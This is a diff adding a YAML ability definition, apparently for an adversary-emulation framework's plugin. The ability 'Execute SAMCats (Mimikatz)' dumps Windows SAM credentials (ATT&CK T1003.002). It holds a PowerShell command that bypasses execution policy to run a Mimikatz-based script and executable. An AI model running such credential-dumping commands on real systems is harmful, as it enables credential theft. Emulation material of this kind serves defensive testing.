@@ -1,0 +1,47 @@
+ability_id: b15d3014-a5d1-4ec6-934b-d7fe44451192
+access: {}
+additional_info: {}
+buckets:
+- os-credential-dumping
+delete_payload: true
+description: Dump SAM via Mimikatz(T1003.002)
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: powershell.exe -ExecutionPolicy Bypass -NoExit -File "C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\uac-samcats.ps1"
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - uac-samcats.ps1
+  - samcat.exe
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: powershell.exe -ExecutionPolicy Bypass -NoExit -File "C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\uac-samcats.ps1"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - uac-samcats.ps1
+  - samcat.exe
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Execute SAMCats (Mimikatz)
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: os-credential-dumping
+technique_id: T1003.002
+technique_name: 'OS Credential Dumping: Security Account Manager'
